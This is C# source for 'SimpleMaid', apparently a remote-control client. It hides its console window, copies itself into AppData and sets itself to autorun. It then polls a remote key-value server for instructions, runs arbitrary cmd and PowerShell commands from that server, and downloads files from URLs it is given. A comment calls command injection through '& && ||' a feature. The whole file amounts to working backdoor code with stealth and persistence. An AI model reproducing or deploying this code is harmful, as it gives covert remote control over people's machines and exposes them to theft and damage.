using IniParser;
using IniParser.Model;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace SimpleMaid
{
  class Program
  {
    private static readonly Application app = new Application();
    private static string appDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static string config = resources.ConfigName;
    private static IntPtr handle;
    private static Mutex  programMutex;

    #region Global threads
    private static Thread connectionThread;
    private static Thread commandThread;
    private static Thread chatThread;

    private static volatile bool busyCommandWise = false;
    private static volatile bool busyChatWise = false;
    #endregion
    private static volatile bool internetAlive = true;

    #region Global settings
    // TODO: Get rid of these
    private static volatile string machine;
    private static volatile string pass;
    #endregion

    #region Across forms
    public static frmChatWindow ChatboxWindow = null;
    public static volatile bool ChatboxExit = false;
    public static volatile string ChatMessage;
    public static volatile string ChatCommand;
    #endregion


    public static string Set(string tag, string value)
    {
      tag = app.ProductName + "_" + tag;

      UTF8Encoding encoding = new UTF8Encoding();
      byte[] requestBody = encoding.GetBytes("tag=" + tag + "&value=" + value + "&fmt=html");

      HttpWebRequest request = (HttpWebRequest)WebRequest.Create(resources.ServerAddress + "storeavalue");
      request.Method = "POST";
      request.Credentials = CredentialCache.DefaultCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException exc)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }
      try { using (var response = request.GetResponse()) ;}
      catch (WebException exc)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Gray;
      Console.WriteLine("SET  {0}  {1}\n", tag, value);

      return String.Empty;
    }

    public static string Get(string tag)
    {
      tag = app.ProductName + "_" + tag;

      string value;

      UTF8Encoding encoding = new UTF8Encoding();
      byte[] requestBody = encoding.GetBytes("tag=" + tag + "&fmt=html");

      HttpWebRequest request = (HttpWebRequest)WebRequest.Create(resources.ServerAddress + "getvalue");
      request.Method = "POST";
      request.Credentials = CredentialCache.DefaultCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException exc)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Refactor
      try
      {
        using (var response = request.GetResponse())
        using (var responseStream = response.GetResponseStream())
        using (var sr = new StreamReader(responseStream))
        {
          value = sr.ReadToEnd();
          value = value.Substring(value.IndexOf(tag) + tag.Length + 4);
          value = value.Remove(value.IndexOf("\""));
        }
      }
      catch (WebException exc)
      {
        reportWebError();
        internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Rewrite - problems with decoding
      value = PublicMethods.DecodeEncodedNonAsciiCharacters(value);
      value = value.Replace(@"\/", @"/");
      value = value.Replace(@"\\", @"\");
      value = WebUtility.HtmlDecode(value);

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkGreen;
      Console.WriteLine("GET  {0}  {1}\n", tag, value);

      return value;
    }


    [STAThread]
    static void Main(string[] args)
    {
      System.Windows.Forms.Application.EnableVisualStyles();
      Console.Clear();
      app.State = "running";

      appDir = String.Format("{0}\\{1}\\{2}\\", appDir, app.CompanyName, app.ProductName);
      config = appDir + config;

      #region CMD args: check presence
      bool rogueArgFound = false;
      bool autorunArgFound = false;
      bool passArgFound = false;

      string passArg = resources.DefaultPassword;
      if (args.Length >= 1)
      {
        rogueArgFound = PublicMethods.CheckConsoleArgument(resources.RogueArgument, args);
        autorunArgFound = PublicMethods.CheckConsoleArgument(resources.AutorunArgument, args);
        if (args.Length >= 2)
        {
          for (int i = 0; i < args.Length; ++i)
          {
            if (args[i] == resources.PasswordArgument)
            {
              passArg = args[i + 1];
              passArgFound = true;
            }
          }
        }
      }
      #endregion

      #region Handle autorun
      handle = NativeMethods.GetConsoleWindow();
      bool inAutorunDir = appDir == app.Directory;
      if (inAutorunDir || rogueArgFound)
      {
        NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
        app.Hidden = true;
      }
      #endregion

      #region Localization
      CultureInfo.DefaultThreadCurrentCulture = CultureInfo.GetCultureInfo(CultureInfo.InstalledUICulture.Name);
      CultureInfo.DefaultThreadCurrentUICulture = CultureInfo.GetCultureInfo(CultureInfo.InstalledUICulture.Name);
      #endregion

      #region OS/priveleges check
      if (SimplePlatform.Platform.Unix == SimplePlatform.runningPlatform())
      {
        reportGeneralError(resources.OSErrorMessage);
        exit();
      }
      else
      {
        if (PublicMethods.IsAppElevated())
        {
          reportGeneralError(resources.AdminErrorMessage);
          exit();
        }
      }
      #endregion

      #region Handle previous instance
      programMutex = new Mutex(false, "Local\\" + app.Guid);
      if (!programMutex.WaitOne(0, false))
      {
        Console.BackgroundColor = ConsoleColor.Black;
        Console.ForegroundColor = ConsoleColor.DarkMagenta;
        Console.WriteLine(resources.PastSins);
        exit();
      }
      #endregion

      #region Startup directory management
      PublicMethods.DirectoryCopy(ConfigurationManager.AppSettings["SvtFolderName"], appDir);
      #endregion

      #region Necessary INI declarations
      var config_parser = new FileIniDataParser();
      IniData configuration;
      #endregion

      #region Settings to read
      bool   machineConfigured = false;
      string machineName       = createMachine();
      string machinePassword   = passArg;
      bool   autoRun           = !autorunArgFound;
      #endregion

      #region Compose configuration file
      bool firstRun;
      bool promptShown = false;
      if (firstRun = !File.Exists(config))
      {
        configuration = new IniData();

        configuration.Sections.AddSection("Service");

        configuration["Service"].AddKey("bMachineConfigured", machineConfigured.ToString());
        configuration["Service"].AddKey("sMachineName", machineName);
        #region configuration["Service"].AddKey("sMachinePassword", machinePassword);
        if (!isPasswordOK(machinePassword))
        {
          if (app.Hidden)
            NativeMethods.ShowWindow(handle, NativeMethods.SW_SHOW);

          configuration["Service"].AddKey("sMachinePassword", new NetworkCredential(String.Empty, passwordPrompt()).Password);
          promptShown = true;

          if (app.Hidden)
            NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
        }
        else
        {
          configuration["Service"].AddKey("sMachinePassword", machinePassword);
        }
        #endregion
        #region configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        #endregion
      }
      else
      {
        configuration = config_parser.ReadFile(config);

        machineConfigured = bool.Parse(configuration["Service"]["bMachineConfigured"]);
        #region machineName = configuration["Service"]["sMachineName"];
        if (resources.KeywordDefault != configuration["Service"]["sMachineName"])
        {
          machineName = configuration["Service"]["sMachineName"];
        }
        else
        {
          configuration["Service"]["sMachineName"] = machineName;
          machineConfigured = false;
        }
        #endregion
        #region machinePassword = configuration["Service"]["sMachinePassword"];
        machinePassword = configuration["Service"]["sMachinePassword"];

        if (!passArgFound)
        {
          if (!isPasswordOK(machinePassword))
          {
            if (app.Hidden)
              NativeMethods.ShowWindow(handle, NativeMethods.SW_SHOW);

            configuration["Service"]["sMachinePassword"] = new NetworkCredential(String.Empty, passwordPrompt()).Password;
            promptShown = true;
            machinePassword = configuration["Service"]["sMachinePassword"];

            if (app.Hidden)
              NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
          }
        }
        else
        {
          if (isPasswordOK(passArg))
          {
            configuration["Service"]["sMachinePassword"] = passArg;
            machinePassword = configuration["Service"]["sMachinePassword"];
          }
          else
          {
            if (!isPasswordOK(machinePassword))
            {
              if (app.Hidden)
                NativeMethods.ShowWindow(handle, NativeMethods.SW_SHOW);

              configuration["Service"]["sMachinePassword"] = new NetworkCredential(String.Empty, passwordPrompt()).Password;
              promptShown = true;
              machinePassword = configuration["Service"]["sMachinePassword"];

              if (app.Hidden)
                NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
            }
          }
        }
        #endregion
        #region autoRun = bool.Parse(configuration["Service"]["bAutoRun"])
        if (!autorunArgFound)
        {
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        else
        {
          configuration["Service"]["bAutoRun"] = (!bool.Parse(configuration["Service"]["bAutoRun"])).ToString();
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        #endregion
      }
      #endregion

      // TODO: Get rid of these
      machine = machineName;
      pass = machinePassword;

      #region Enable/disable autorun
      if (autoRun)
      {
        if (!inAutorunDir)
        {
          var file_oldpaths = new List<string>();
          var file_paths = new List<string>();

          string app_path = String.Format("{0}{1}.exe", appDir, app.ProductName); // desired path, not actual one (app.ExecutablePath)
          string app_config_path = String.Format("{0}{1}.exe.config", app.Directory, app.ProductName); // actual path, not desired one

          file_oldpaths.Add(app.ExecutablePath);
          file_paths.Add(app_path);
          // TODO: Kick some asses
          var ass_paths = new string[] { app_config_path, app.Directory + "INIFileParser.dll" };
          foreach (var ass in ass_paths)
          {
            file_oldpaths.Add(ass);
            file_paths.Add(appDir + Path.GetFileName(ass));
          }

          if (file_oldpaths.Count != file_paths.Count)
          {
            reportGeneralError(resources.OldnewErrorMessage);
            exit();
          }

          for (int i = 0; i < file_paths.Count; ++i)
          {
            File.Copy(file_oldpaths[i], file_paths[i], true);
          }

          PublicMethods.SwitchAppAutorun(autoRun, app.ProductName, app_path);
        }
        else
        {
          PublicMethods.SwitchAppAutorun(autoRun, app.ProductName, app.ExecutablePath);
        }
      }
      else
      {
        PublicMethods.SwitchAppAutorun(autoRun, app.ProductName);
      }
      #endregion

      #region Configure machine
      if (!machineConfigured)
      {
        string machines = getMachinesList();

        if (!machines.Contains(machine))
        {
          while (resources.WebErrorMessage == Set("machines", String.Format("{0}{1}:", machines, machine)))
          {
            Thread.Sleep(1000);
          }
        }
      }
      #endregion

      #region Update INI file
      if (firstRun || !machineConfigured || autorunArgFound || passArgFound || promptShown)
      {
        machineConfigured = true;
        configuration["Service"]["bMachineConfigured"] = machineConfigured.ToString();

        config_parser.WriteFile(config, configuration);
      }
      #endregion

      #region 1 - Time Thread
      var timeThread = new Thread(sendMachineTime);
      timeThread.IsBackground = true;
      timeThread.Start();
      #endregion
      Thread.Sleep(1000);

      #region 2 - Connection Thread
      connectionThread = new Thread(handleConnection);
      connectionThread.IsBackground = true;
      connectionThread.Start();
      #endregion

      #region 3 - Command Thread
      commandThread = new Thread(awaitCommands);
      commandThread.IsBackground = true;
      // Starts in a different place
      #endregion

      #region 4 - Chat Thread
      chatThread = new Thread(fetchMessages);
      chatThread.IsBackground = true;
      // Starts in a different place
      #endregion

      timeThread.Join();
    }


    private static void exit()
    {
      Thread.Sleep(int.Parse(resources.GeneralExitDelay));
      Environment.Exit(0);
    }

    private static string createMachine()
    {
      // TODO: Use MAC address?
      return Guid.NewGuid().ToString();
    }

    private static string getMachinesList()
    {
      // Simple hack to bypass 500 characters limit
      int listIndex = -1;
      string listTest;
      do
      {
        listIndex++;
        while (resources.WebErrorMessage == (listTest = Get("machines" + listIndex)))
        {
          Thread.Sleep(1000);
        }
      } while (listTest.Length >= int.Parse(resources.IndividualValueLimit));

      string machinesList;
      while (resources.WebErrorMessage == (machinesList = Get("machines" + listIndex)))
      {
        Thread.Sleep(1000);
      }
      return machinesList;
    }

    private static bool isPasswordOK(string p)
    {
      var score = basicPasswordStrength.CheckStrength(p);

      return (score > basicPasswordStrength.PasswordScore.VeryWeak) ? true : false;
    }

    // To get the actual value, not an object: new NetworkCredential(String.Empty, passwordPrompt()).Password
    private static SecureString passwordPrompt()
    {
      string middlePractical = "| " + resources.PasswordEnterTip;
      string middle = middlePractical + " |";
      middle = middlePractical + PublicMethods.GetFilledLine(' ').Remove(0, middle.Length) + " |";

      Console.Write("#" + PublicMethods.GetFilledLine('-').Remove(0, 2) + "#");
      Console.Write(middle);
      Console.Write("#" + PublicMethods.GetFilledLine('-').Remove(0, 2) + "#");
      Console.SetCursorPosition(middlePractical.Length, Console.CursorTop - 2);

      ConsoleKeyInfo keyInfo;
      var passHolder = new SecureString();
      int starsCount = 0;
      int middleDiff = middle.Length - middlePractical.Length;
      while ((keyInfo = Console.ReadKey(true)).Key != ConsoleKey.Enter)
      {
        if (keyInfo.Key != ConsoleKey.Backspace)
        {
          /*if (!((int)ki.Key >= 65 && (int)ki.Key <= 90))
            continue;*/ // <-- stricter, but disallows digits
          if (char.IsControl(keyInfo.KeyChar))
            continue;

          if (starsCount + 1 < middleDiff)
            ++starsCount;
          else
            continue;

          passHolder.AppendChar(keyInfo.KeyChar);

          Console.Write('*');
        }
        else
        {
          if (starsCount - 1 >= 0)
            --starsCount;
          else
            continue;

          passHolder.RemoveAt(passHolder.Length - 1);

          PublicMethods.ClearConsoleLine();
          Console.Write(middlePractical);
          for (int i = 0; i < starsCount; ++i)
          {
            Console.Write('*');
          }
          var pos = new Point(Console.CursorLeft, Console.CursorTop);
          Console.Write(PublicMethods.GetFilledLine(' ').Remove(0, middlePractical.Length + starsCount + " |".Length) + " |");
          Console.SetCursorPosition(pos.X, pos.Y);
        }

        if (starsCount == 0)
        {
          Console.Beep();
        }
        if (starsCount + 1 == middleDiff)
        {
          Console.SetCursorPosition(Console.CursorLeft - 1, Console.CursorTop);
          Console.Beep();
        }
      }

      Console.Clear();

      return passHolder;
    }

    #region Reports
    private static void reportGeneralError(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Blue;
      Console.ForegroundColor = ConsoleColor.White;
      Console.WriteLine(msg + "\n");
    }

    private static void reportWebError()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkYellow;
      Console.WriteLine(resources.WebErrorMessage + "\n");
    }

    private static void reportThreadStart(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Cyan;
      Console.WriteLine(msg + "\n");
    }

    private static void reportThreadStop(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Red;
      Console.WriteLine(msg + "\n");
    }
    #endregion

    private static void openChatWindow()
    {
      busyChatWise = true;

      ChatboxWindow = new frmChatWindow();
      ChatboxWindow.ShowDialog();

      // ! code below only executes after ChatboxWindow is closed

      ChatboxExit = false;

      busyChatWise = false;

      while (resources.WebErrorMessage == Set("commands." + machine, resources.AnswerPrefix + 
        String.Format("{0},{1}", resources.MessageCommand, ChatboxWindow.Visible.ToString())))
      {
        Thread.Sleep(1000);
      }
    }

    private static void closeChatWindow()
    {
      busyChatWise = false;

      ChatboxExit = true;
    }

    private static string executeCommand(string command, bool usePowershell)
    {
      ProcessStartInfo procStartInfo;
      if (!usePowershell)
      {
        procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
      }
      else
      {
        procStartInfo = new ProcessStartInfo("powershell", "-command " + command);
      }

      procStartInfo.RedirectStandardOutput = true;
      procStartInfo.UseShellExecute = false;
      procStartInfo.CreateNoWindow = true;

      Process proc = new Process();
      proc.StartInfo = procStartInfo;
      proc.Start();

      string result = proc.StandardOutput.ReadToEnd();

      result = result.Replace(Environment.NewLine, @"\n");

      return result;
    }


    private static void resurrectDeadThreads()
    {
      if (null != connectionThread && !connectionThread.IsAlive)
      {
        connectionThread = new Thread(handleConnection);
        connectionThread.IsBackground = true;
        connectionThread.Start();
      }
      if (busyCommandWise && null != commandThread && !commandThread.IsAlive)
      {
        commandThread = new Thread(awaitCommands);
        commandThread.IsBackground = true;
        commandThread.Start();
      }
      if (busyChatWise && null != chatThread && !chatThread.IsAlive)
      {
        chatThread = new Thread(fetchMessages);
        chatThread.IsBackground = true;
        chatThread.Start();
      }
    }

    private static void sendMachineTime()
    {
      reportThreadStart(resources.TimeStart);

      while (true)
      {
        var now = DateTime.Now;

        if (resources.WebErrorMessage !=
          Set("time." + machine, String.Format("{0} {1}", now.ToShortDateString(), now.ToLongTimeString())))
        {
          if (!internetAlive)
            resurrectDeadThreads();

          internetAlive = true;
        }

        Thread.Sleep(1000 - now.Millisecond);
      }
    }

    private static void handleConnection()
    {
      reportThreadStart(resources.ConnectionStart);

      while (internetAlive)
      {
        if (Get(machine) == pass)
        {
          busyCommandWise = !busyCommandWise;
          while (resources.WebErrorMessage == Set(machine, String.Empty))
          {
            Thread.Sleep(1000);
          }

          if (busyCommandWise && null != commandThread && !commandThread.IsAlive)
          {
            commandThread = new Thread(awaitCommands);
            commandThread.IsBackground = true;
            commandThread.Start();
          }
        }

        Thread.Sleep(1000);
      }

      reportThreadStop(resources.ConnectionStop);
    }

    private static void fetchMessages()
    {
      reportThreadStart(resources.ChatStart);

      string ans = resources.AnswerPrefix;
      string sep = resources.CommandsSeparator;

      /* Command shortcuts here */

      string sRemoteMessageOld = null;
      while (busyChatWise && internetAlive)
      {
        string sRemoteMessage;
        while (resources.WebErrorMessage == (sRemoteMessage = Get("messages." + machine)))
        {
          Thread.Sleep(1000);
        }

        if (String.Empty == sRemoteMessage || sRemoteMessage.StartsWith(ans))
        {
          Thread.Sleep(1000);
          continue;
        }

        #region Parsing message
        string[] message_parts = sRemoteMessage.Split(new char[] { char.Parse(sep) },
          StringSplitOptions.RemoveEmptyEntries);

        //частный случай m, еще две то есть
        ChatMessage = message_parts[0];
        //ChatCommand = message_parts[1];
        //показал окно чата или скрыл

        while (resources.WebErrorMessage == Set("messages." + machine, String.Empty))
        {
          Thread.Sleep(1000);
        }
        #endregion

        Thread.Sleep(1000);
      }

      reportThreadStop(resources.ChatStop);
    }

    private static void awaitCommands()
    {
      reportThreadStart(resources.CommandStart);

      string ans = resources.AnswerPrefix;
      string sep = resources.CommandsSeparator;

      string rep = resources.RepeatCommand;
      string pow = resources.PowershellCommand;
      //string key = resources.KeyhookCommand; /* app.State = Control.IsKeyLocked(Keys.CapsLock) ? "CAPS LOCK" : app.State; */
      string mes = resources.MessageCommand;
      string dow = resources.DownloadCommand;
      string sho = resources.ShowCommand;
      string hid = resources.HideCommand;
      string qui = resources.QuitCommand;

      while (busyCommandWise && internetAlive)
      {
        string sRemoteCommand;
        while (resources.WebErrorMessage == (sRemoteCommand = Get("commands." + machine)))
        {
          Thread.Sleep(1000);
        }

        if (String.Empty == sRemoteCommand || sRemoteCommand.StartsWith(ans))
        {
          Thread.Sleep(1000);
          continue;
        }

        #region Parsing command
        string[] command_parts = sRemoteCommand.Split(new char[] { char.Parse(sep) },
          StringSplitOptions.RemoveEmptyEntries);
        // Contains delimiter: if (command_parts[0] != sRemoteCommand)

        if (!Regex.IsMatch(sRemoteCommand, "^.;.*"))
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + executeCommand(sRemoteCommand, false)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (rep == command_parts[0] && command_parts.Length >= 2)
        {
          if (!Regex.IsMatch(sRemoteCommand, "^.;.;.*"))
          {
            executeCommand(command_parts[1], false);
          }
          else if (pow == command_parts[1])
          {
            string[] command_parts_fixed = new string[command_parts.Length - 1];
            for (int i = 1; i < command_parts.Length; ++i)
            {
              command_parts_fixed[i - 1] = command_parts[i];
            }

            powershellCommand(command_parts_fixed);
          }
          else
          {
            reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
          }
        }
        else if (pow == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + powershellCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (mes == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + messageCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (dow == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + downloadCommand(command_parts)))
          {
            Thread.Sleep(1000);
          }
        }
        else if (sho == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + showCommand()))
          {
            Thread.Sleep(1000);
          }
        }
        else if (hid == command_parts[0])
        {
          while (resources.WebErrorMessage == Set("commands." + machine, ans + hideCommand()))
          {
            Thread.Sleep(1000);
          }
        }
        else if (qui == command_parts[0])
        {
          exitCommand();
        }
        else
        {
          reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
        }
        #endregion
        
        Thread.Sleep(1000);
      }

      reportThreadStop(resources.CommandStop);
    }


    private static void exitCommand()
    {
      Environment.Exit(0);
    }

    private static string hideCommand()
    {
      if (app.Hidden) return resources.GeneralOKMessage;

      NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);
      app.Hidden = true;

      return resources.GeneralOKMessage;
    }

    private static string showCommand()
    {
      if (!app.Hidden) return resources.GeneralOKMessage;

      NativeMethods.ShowWindow(handle, NativeMethods.SW_SHOW);
      app.Hidden = false;

      return resources.GeneralOKMessage;
    }

    private static string downloadCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return resources.IncompleteCommandErrMsg;
      }

      string download_dir = null;
      string download_file = null;

      bool quickDownload;
      if ((quickDownload = (command_parts.Length == 2)) || "d" == command_parts[2])
      {
        download_dir = String.Format("{0}{1}\\", Path.GetTempPath(), Guid.NewGuid().ToString().ToUpper());
        download_file = PublicMethods.UrlToFile(command_parts[1]);
      }
      // TODO: Атаки типа "& && ||" - не баг, а фича!
      else if (command_parts.Length >= 3)
      {
        string ev = resources.EvaluateCmdVariable;

        int indexOfCmdVariable = command_parts[2].IndexOf(resources.EvaluateCmdVariable);

        if (-1 != indexOfCmdVariable)
        {
          char evd = char.Parse(resources.EvaluateCmdVariableEnd);

          var indexesOfCmdVariables = command_parts[2].AllIndexesOf(ev);

          int diff = 0;
          foreach (int index in indexesOfCmdVariables)
          {
            string variable = PublicMethods.PackmaniseString(command_parts[2], (index + ev.Length) - diff, evd);

            /*if (variable.Contains(" "))
            {
              reportGeneralError(resources.OldnewErrorMessage);
              return;
            }*/

            string unEvaluatedVariable = ev + variable + evd;
            string evaluatedVariable = executeCommand("echo " + variable, false);
            command_parts[2] = command_parts[2].Replace(unEvaluatedVariable, evaluatedVariable);

            diff += unEvaluatedVariable.Length - evaluatedVariable.Length;
          }
        }

        download_dir = Path.GetDirectoryName(command_parts[2]) + "\\";
        download_file = Path.GetFileName(command_parts[2]);
      }

      Directory.CreateDirectory(download_dir);

      // TODO: Use my FTP
      using (var wc = new WebClient())
      {
        try
        {
          wc.DownloadFile(new Uri(command_parts[1]), download_dir + download_file);
        }
        catch (Exception exc)
        {
          return exc.Message;
        }

        if (quickDownload)
          Process.Start(download_dir);
        
        return download_dir + download_file;
      }
    }

    private static string messageCommand(string[] command_parts)
    {
      if (ChatboxWindow == null || ChatboxWindow.IsDisposed)
      {
        #region 3.5 - ChatBox Thread
        var chatboxThread = new Thread(openChatWindow);
        chatboxThread.IsBackground = true;
        chatboxThread.Start();
        #endregion

        while (null == ChatboxWindow || !ChatboxWindow.Visible)
        {
          Thread.Sleep(1000);
        }

        #region 4 - Chat Thread
        if (busyChatWise && null != chatThread && !chatThread.IsAlive)
        {
          chatThread = new Thread(fetchMessages);
          chatThread.IsBackground = true;
          chatThread.Start();
        }
        #endregion
      }
      else
      {
        closeChatWindow();
      }

      return String.Format("{0},{1}", resources.MessageCommand, ChatboxWindow.Visible.ToString());
    }

    private static string powershellCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return resources.IncompleteCommandErrMsg;
      }

      for (int i = 2; i < command_parts.Length; ++i)
      {
        command_parts[1] += "; " + command_parts[i];
      }
      command_parts[1] = command_parts[1].Replace(@"""", @"\""");

      return executeCommand(command_parts[1], true);
    }
  }
}
